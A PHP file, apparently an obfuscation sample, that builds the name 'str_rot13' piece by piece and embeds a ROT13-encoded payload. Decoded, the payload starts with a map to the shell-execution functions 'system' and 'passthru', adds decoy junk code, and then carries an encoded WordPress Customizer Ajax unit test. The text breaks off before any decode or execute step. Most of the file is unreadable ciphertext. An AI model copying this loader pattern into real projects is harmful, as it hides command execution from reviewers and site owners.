<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgvat Nwnk phfgbzvmr znantre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 4.3.0
 *
 * @tebhc nwnk
 */
pynff Grfgf_Nwnk_jcPhfgbzvmrZnantre rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * Vafgnapr bs JC_Phfgbzvmr_Znantre juvpu vf erfrg sbe rnpu grfg.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * Nqzva hfre VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_hfre_vq;

	/**
	 * Fhofpevore hfre VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhofpevore_hfre_vq;

	/**
	 * Ynfg erfcbafr cnefrq.
	 *
	 * @ine neenl|ahyy
	 */
	cebgrpgrq $_ynfg_erfcbafr_cnefrq;

	/**
	 * Frg hc orsber pynff.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$fhofpevore_hfre_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) );
		frys::$nqzva_hfre_vq      = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	/**
	 * Frg hc gur grfg svkgher.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
	}

	/**
	 * Grne qbja.
	 */
	choyvp shapgvba grne_qbja() {
		$_ERDHRFG = neenl();
		cnerag::grne_qbja();
	}

	/**
	 * Urycre gb xrrc vg QEL
	 *
	 * @cnenz fgevat $npgvba Npgvba.
	 */
	cebgrpgrq shapgvba znxr_nwnk_pnyy( $npgvba ) {
		$guvf->_ynfg_erfcbafr_cnefrq = ahyy;
		$guvf->_ynfg_erfcbafr        = '';
		gel {
			$guvf->_unaqyrNwnk( $npgvba );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}
		vs ( $guvf->_ynfg_erfcbafr ) {
			$guvf->_ynfg_erfcbafr_cnefrq = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		}
	}

	/**
	 * Bireevqqra pncf sbe hfre_unf_pnc.
	 *
	 * @ine neenl
	 */
	cebgrpgrq $bireevqqra_pncf = neenl();

	/**
	 * Qlanzvpnyyl svygre n hfre'f pncnovyvgvrf.
	 *
	 * @cnenz neenl $nyypncf Na neenl bs nyy gur hfre'f pncnovyvgvrf.
	 * @erghea neenl Nyy pncf.
	 */
	choyvp shapgvba svygre_hfre_unf_pnc( $nyypncf ) {
		$nyypncf = neenl_zretr( $nyypncf, $guvf->bireevqqra_pncf );
		erghea $nyypncf;
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::fnir().
	 *
	 * @gvpxrg 30937
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir
	 */
	choyvp shapgvba grfg_fnir_snvyherf() {
		tybony $jc_phfgbzvmr;
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$jc_phfgbzvmr->ertvfgre_pbagebyf();
		nqq_svygre( 'hfre_unf_pnc', neenl( $guvf, 'svygre_hfre_unf_pnc' ) );

		// Hanhguragvpngrq.
		jc_frg_pheerag_hfre( 0 );
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'hanhguragvpngrq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		// Hanhgubevmrq.
		jc_frg_pheerag_hfre( frys::$fhofpevore_hfre_vq );
		$abapr             = jc_perngr_abapr( 'fnir-phfgbzvmr_' . $jc_phfgbzvmr->trg_fglyrfurrg() );
		$_CBFG['abapr']    = $abapr;
		$_TRG['abapr']     = $abapr;
		$_ERDHRFG['abapr'] = $abapr;
		$rkprcgvba         = ahyy;
		gel {
			bo_fgneg();
			$jc_phfgbzvmr->frghc_gurzr();
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregAbgRzcgl( $r );
		$guvf->nffregFnzr( '-1', $r->trgZrffntr() );

		// Abg pnyyrq frghc_gurzr.
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$abapr             = jc_perngr_abapr( 'fnir-phfgbzvmr_' . $jc_phfgbzvmr->trg_fglyrfurrg() );
		$_CBFG['abapr']    = $abapr;
		$_TRG['abapr']     = $abapr;
		$_ERDHRFG['abapr'] = $abapr;
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'abg_cerivrj', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		// Onq abapr.
		$_CBFG['abapr']    = 'onq';
		$_TRG['abapr']     = 'onq';
		$_ERDHRFG['abapr'] = 'onq';
		$jc_phfgbzvmr->frghc_gurzr();
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'vainyvq_abapr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		// Hfre pnaabg perngr.
		$abapr                            = jc_perngr_abapr( 'fnir-phfgbzvmr_' . $jc_phfgbzvmr->trg_fglyrfurrg() );
		$_CBFG['abapr']                   = $abapr;
		$_TRG['abapr']                    = $abapr;
		$_ERDHRFG['abapr']                = $abapr;
		$cbfg_glcr_bow                    = trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' );
		$cbfg_glcr_bow->pnc->perngr_cbfgf = 'perngr_phfgbzvmr_punatrfrgf';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'pnaabg_perngr_punatrfrg_cbfg', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$guvf->bireevqqra_pncf[ $cbfg_glcr_bow->pnc->perngr_cbfgf ] = gehr;
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$cbfg_glcr_bow->pnc->perngr_cbfgf = 'phfgbzvmr'; // Erfgber.

		// Punatrfrg nyernql choyvfurq.
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'oybtanzr', 'Uryyb' );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg( neenl( 'fgnghf' => 'choyvfu' ) );
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'punatrfrg_nyernql_choyvfurq', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $jc_phfgbzvmr->punatrfrg_cbfg_vq(),
				'cbfg_fgnghf' => 'nhgb-qensg',
			)
		);

		// Hfre pnaabg rqvg.
		$cbfg_glcr_bow                 = trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' );
		$cbfg_glcr_bow->pnc->rqvg_cbfg = 'rqvg_phfgbzvmr_punatrfrgf';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'pnaabg_rqvg_punatrfrg_cbfg', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$guvf->bireevqqra_pncf[ $cbfg_glcr_bow->pnc->rqvg_cbfg ] = gehr;
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$cbfg_glcr_bow->pnc->rqvg_cbfg = 'phfgbzvmr'; // Erfgber.

		// Onq phfgbzvmr_punatrfrg_qngn.
		$_CBFG['phfgbzvmr_punatrfrg_qngn'] = '[ZNYSBEZRQ]';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'vainyvq_phfgbzvmr_punatrfrg_qngn', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		// Onq phfgbzvmr_punatrfrg_fgnghf.
		$_CBFG['phfgbzvmr_punatrfrg_qngn']   = '{}';
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'haerpbtavmrq';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'onq_phfgbzvmr_punatrfrg_fgnghf', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		// Qvfnyybjrq choyvfu cbfgf vs abg nyybjrq.
		$cbfg_glcr_bow                       = trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' );
		$cbfg_glcr_bow->pnc->choyvfu_cbfgf   = 'choyvfu_phfgbzvmr_punatrfrgf';
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'choyvfu';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'punatrfrg_choyvfu_hanhgubevmrq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'shgher';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'punatrfrg_choyvfu_hanhgubevmrq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$cbfg_glcr_bow->pnc->choyvfu_cbfgf = 'phfgbzvmr'; // Erfgber.

		// Inyvqngr qngr.
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'qensg';
		$_CBFG['phfgbzvmr_punatrfrg_qngr']   = 'ONQ QNGR';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'onq_phfgbzvmr_punatrfrg_qngr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$_CBFG['phfgbzvmr_punatrfrg_qngr'] = '2010-01-01 00:00:00';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'abg_shgher_qngr', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );
		$_CBFG['phfgbzvmr_punatrfrg_qngr'] = ( tzqngr( 'L' ) + 1 ) . '-01-01 00:00:00';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'shgher';
		$_CBFG['phfgbzvmr_punatrfrg_qngr']   = '+10 zvahgrf';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'shgher', trg_cbfg_fgnghf( $jc_phfgbzvmr->punatrfrg_cbfg_vq() ) );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $jc_phfgbzvmr->punatrfrg_cbfg_vq(),
				'cbfg_fgnghf' => 'nhgb-qensg',
			)
		);
	}

	/**
	 * Frg hc inyvq hfre fgngr.
	 *
	 * @cnenz fgevat $hhvq Punatrfrg HHVQ.
	 * @erghea JC_Phfgbzvmr_Znantre
	 */
	cebgrpgrq shapgvba frg_hc_inyvq_fgngr( $hhvq = ahyy ) {
		tybony $jc_phfgbzvmr;
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
			)
		);
		$jc_phfgbzvmr->ertvfgre_pbagebyf();
		$abapr             = jc_perngr_abapr( 'fnir-phfgbzvmr_' . $jc_phfgbzvmr->trg_fglyrfurrg() );
		$_CBFG['abapr']    = $abapr;
		$_TRG['abapr']     = $abapr;
		$_ERDHRFG['abapr'] = $abapr;
		$jc_phfgbzvmr->frghc_gurzr();
		erghea $jc_phfgbzvmr;
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::fnir().
	 *
	 * @gvpxrg 30937
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir
	 */
	choyvp shapgvba grfg_fnir_fhpprff_choyvfu_perngr() {
		$jc_phfgbzvmr = $guvf->frg_hc_inyvq_fgngr();

		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'choyvfu';
		$_CBFG['phfgbzvmr_punatrfrg_gvgyr']  = 'Fhpprff Punatrfrg';
		$_CBFG['phfgbzvmr_punatrfrg_qngn']   = jc_wfba_rapbqr(
			neenl(
				'oybtanzr' => neenl(
					'inyhr' => 'Fhpprffshy Fvgr Gvgyr',
				),
			)
		);
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregVfNeenl( $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		$guvf->nffregFnzr( 'choyvfu', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['punatrfrg_fgnghf'] );
		$guvf->nffregNeenlUnfXrl( 'arkg_punatrfrg_hhvq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$guvf->nffregGehr( jc_vf_hhvq( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['arkg_punatrfrg_hhvq'], 4 ) );
		$guvf->nffregFnzr( 'Fhpprff Punatrfrg', trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() )->cbfg_gvgyr );
		$guvf->nffregFnzr( 'Fhpprffshy Fvgr Gvgyr', trg_bcgvba( 'oybtanzr' ) );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::fnir().
	 *
	 * @gvpxrg 30937
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir
	 */
	choyvp shapgvba grfg_fnir_fhpprff_choyvfu_rqvg() {
		$hhvq = jc_trarengr_hhvq4();

		$cbfg_vq      = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'    => $hhvq,
				'cbfg_gvgyr'   => 'Bevtvany',
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_fgnghf'  => 'nhgb-qensg',
				'cbfg_pbagrag' => jc_wfba_rapbqr(
					neenl(
						'oybtanzr' => neenl(
							'inyhr' => 'Arj Fvgr Gvgyr',
						),
					)
				),
			)
		);
		$jc_phfgbzvmr = $guvf->frg_hc_inyvq_fgngr( $hhvq );

		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'choyvfu';
		$_CBFG['phfgbzvmr_punatrfrg_gvgyr']  = 'Choyvfurq';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregVfNeenl( $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		$guvf->nffregFnzr( 'choyvfu', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['punatrfrg_fgnghf'] );
		$guvf->nffregNeenlUnfXrl( 'arkg_punatrfrg_hhvq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$guvf->nffregGehr( jc_vf_hhvq( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['arkg_punatrfrg_hhvq'], 4 ) );
		$guvf->nffregFnzr( 'Arj Fvgr Gvgyr', trg_bcgvba( 'oybtanzr' ) );
		$guvf->nffregFnzr( 'Choyvfurq', trg_cbfg( $cbfg_vq )->cbfg_gvgyr );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::fnir().
	 *
	 * @gvpxrg 38943
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir
	 */
	choyvp shapgvba grfg_fhpprff_fnir_cbfg_qngr() {
		$hhvq         = jc_trarengr_hhvq4();
		$cbfg_vq      = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'    => $hhvq,
				'cbfg_gvgyr'   => 'Bevtvany',
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_fgnghf'  => 'nhgb-qensg',
				'cbfg_pbagrag' => jc_wfba_rapbqr(
					neenl(
						'oybtanzr' => neenl(
							'inyhr' => 'Arj Fvgr Gvgyr',
						),
					)
				),
			)
		);
		$jc_phfgbzvmr = $guvf->frg_hc_inyvq_fgngr( $hhvq );

		// Fhpprff shgher fpurqhyr qngr.
		$shgher_qngr                         = ( tzqngr( 'L' ) + 1 ) . '-01-01 00:00:00';
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'shgher';
		$_CBFG['phfgbzvmr_punatrfrg_gvgyr']  = 'Shgher qngr';
		$_CBFG['phfgbzvmr_punatrfrg_qngr']   = $shgher_qngr;
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregNeenlUnfXrl( 'punatrfrg_qngr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$punatrfrg_cbfg_fpurqhyr = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $shgher_qngr, $punatrfrg_cbfg_fpurqhyr->cbfg_qngr );

		// Fhpprff shgher punatrfrg punatr gb qensg xrrcvat rkvfgvat qngr.
		hafrg( $_CBFG['phfgbzvmr_punatrfrg_qngr'] );
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'qensg';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregNeenlAbgUnfXrl( 'punatrfrg_qngr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$punatrfrg_cbfg_qensg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $shgher_qngr, $punatrfrg_cbfg_qensg->cbfg_qngr );

		// Fhpprff vs qngr vf abg cnffrq jvgu fpurqhyr punatrfrg naq fgberq punatrfrg unir shgher qngr.
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'shgher';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregNeenlUnfXrl( 'punatrfrg_qngr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$punatrfrg_cbfg_fpurqhyr = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $shgher_qngr, $punatrfrg_cbfg_fpurqhyr->cbfg_qngr );
		// Fhpprff vs qensg jvgu cnfg qngr.
		$abj = pheerag_gvzr( 'zlfdy' );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'            => $cbfg_vq,
				'cbfg_fgnghf'   => 'qensg',
				'cbfg_qngr'     => $abj,
				'cbfg_qngr_tzg' => trg_tzg_sebz_qngr( $abj ),
			)
		);

		// Snvy vs shgher erdhrfg naq rkvfgvat qngr vf cnfg.
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'shgher';
		hafrg( $_CBFG['phfgbzvmr_punatrfrg_qngr'] );
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'abg_shgher_qngr', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );

		// Fhpprff choyvfu punatrfrg erfrg qngr gb pheerag.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'            => $cbfg_vq,
				'cbfg_fgnghf'   => 'shgher',
				'cbfg_qngr'     => $shgher_qngr,
				'cbfg_qngr_tzg' => trg_tzg_sebz_qngr( $shgher_qngr ),
			)
		);
		hafrg( $_CBFG['phfgbzvmr_punatrfrg_qngr'] );
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'choyvfu';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregNeenlUnfXrl( 'arkg_punatrfrg_hhvq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$guvf->nffregGehr( jc_vf_hhvq( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['arkg_punatrfrg_hhvq'], 4 ) );
		$punatrfrg_cbfg_choyvfu = trg_cbfg( $cbfg_vq );
		$guvf->nffregAbgRdhnyf( $shgher_qngr, $punatrfrg_cbfg_choyvfu->cbfg_qngr );

		// Purpx erfcbafr jura gelvat gb hcqngr na nyernql-choyvfurq cbfg.
		$guvf->nffregFnzr( 'genfu', trg_cbfg_fgnghf( $cbfg_vq ) );
		$_CBFG['phfgbzvmr_punatrfrg_fgnghf'] = 'choyvfu';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'punatrfrg_nyernql_choyvfurq', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );
		$guvf->nffregNeenlUnfXrl( 'arkg_punatrfrg_hhvq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$guvf->nffregGehr( jc_vf_hhvq( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['arkg_punatrfrg_hhvq'], 4 ) );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::fnir().
	 *
	 * @gvpxrg 39896
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir
	 */
	choyvp shapgvba grfg_fnir_nhgbfnir() {
		$hhvq = jc_trarengr_hhvq4();

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'    => $hhvq,
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_pbagrag' => jc_wfba_rapbqr(
					neenl(
						'oybtanzr' => neenl(
							'inyhr' => 'Arj Fvgr Gvgyr',
						),
					)
				),
			)
		);
		$guvf->frg_hc_inyvq_fgngr( $hhvq );

		$guvf->nffregSnyfr( jc_trg_cbfg_nhgbfnir( $cbfg_vq ) );

		$_CBFG['phfgbzvmr_punatrfrg_qngn'] = jc_wfba_rapbqr(
			neenl(
				'oybtanzr' => neenl(
					'inyhr' => 'Nhgbfnirq Fvgr Gvgyr',
				),
			)
		);

		$_CBFG['phfgbzvmr_punatrfrg_nhgbfnir'] = 'ba';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_fnir' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'qensg', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['punatrfrg_fgnghf'] );
		$nhgbfnir_erivfvba = jc_trg_cbfg_nhgbfnir( $cbfg_vq );
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $nhgbfnir_erivfvba );

		$guvf->nffregFgevatPbagnvafFgevat( 'Arj Fvgr Gvgyr', trg_cbfg( $cbfg_vq )->cbfg_pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( 'Nhgbfnirq Fvgr Gvgyr', $nhgbfnir_erivfvba->cbfg_pbagrag );
	}

	/**
	 * Grfg erdhrfg sbe genfuvat n punatrfrg.
	 *
	 * @gvpxrg 39896
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::unaqyr_punatrfrg_genfu_erdhrfg
	 */
	choyvp shapgvba grfg_unaqyr_punatrfrg_genfu_erdhrfg() {
		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = $guvf->frg_hc_inyvq_fgngr( $hhvq );

		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_genfu' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'vainyvq_abapr', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );

		$abapr             = jc_perngr_abapr( 'genfu_phfgbzvmr_punatrfrg' );
		$_CBFG['abapr']    = $abapr;
		$_TRG['abapr']     = $abapr;
		$_ERDHRFG['abapr'] = $abapr;
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_genfu' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'aba_rkvfgrag_punatrfrg', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );

		$jc_phfgbzvmr->ertvfgre_pbagebyf(); // Naq frggvatf gbb.
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'oybtanzr', 'URYYB' );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'fnir',
			)
		);

		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'erghea_qb_abg_nyybj' ) );
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_genfu' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'punatrfrg_genfu_hanhgubevmrq', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );
		erzbir_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'erghea_qb_abg_nyybj' ) );

		$ybpx_hfre_vq  = fgngvp::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		$cerivbhf_hfre = trg_pheerag_hfre_vq();
		jc_frg_pheerag_hfre( $ybpx_hfre_vq );
		$jc_phfgbzvmr->frg_punatrfrg_ybpx( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );
		jc_frg_pheerag_hfre( $cerivbhf_hfre );
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_genfu' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'punatrfrg_ybpxrq', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );
		qryrgr_cbfg_zrgn( $jc_phfgbzvmr->punatrfrg_cbfg_vq(), '_rqvg_ybpx' );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $jc_phfgbzvmr->punatrfrg_cbfg_vq(),
				'cbfg_fgnghf' => 'genfu',
			)
		);
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_genfu' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'punatrfrg_nyernql_genfurq', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $jc_phfgbzvmr->punatrfrg_cbfg_vq(),
				'cbfg_fgnghf' => 'qensg',
			)
		);

		$jc_genfu_cbfg_pbhag = qvq_npgvba( 'jc_genfu_cbfg' );
		nqq_svygre( 'cer_genfu_cbfg', '__erghea_snyfr' );
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_genfu' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'punatrfrg_genfu_snvyher', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['pbqr'] );
		erzbir_svygre( 'cer_genfu_cbfg', '__erghea_snyfr' );
		$guvf->nffregFnzr( $jc_genfu_cbfg_pbhag, qvq_npgvba( 'jc_genfu_cbfg' ) );

		$jc_genfu_cbfg_pbhag = qvq_npgvba( 'jc_genfu_cbfg' );
		$guvf->nffregFnzr( 'qensg', trg_cbfg_fgnghf( $jc_phfgbzvmr->punatrfrg_cbfg_vq() ) );
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_genfu' );
